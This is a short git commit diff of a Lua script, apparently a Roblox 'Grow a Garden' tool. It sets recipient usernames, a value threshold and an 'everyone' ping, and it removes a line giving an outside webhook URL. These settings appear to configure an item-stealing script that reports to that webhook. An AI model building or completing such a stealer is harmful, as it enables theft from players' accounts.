f82d14adde56d4837c620649464fbfdef7e0b665
ShxDrag <bns19126@gmail.com>
2026-08-22 14:33:06 +0900

    Update Admozp.lua

--- Admozp.lua
+++ Admozp.lua
@@ -66,7 +66,6 @@ end
 _G.Usernames = {"GROW4GArden1m10016","GROW4GARDEN1M10017","GROW4GARDEN1M10018","GROW4GARDEN1M10019","GROW4GARDEN1M10020"}
 _G.min_value = 0.03
 _G.pingEveryone = "Yes"
-_G.webhook = "https://megamegamega.vercel.app/api/webhook"
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
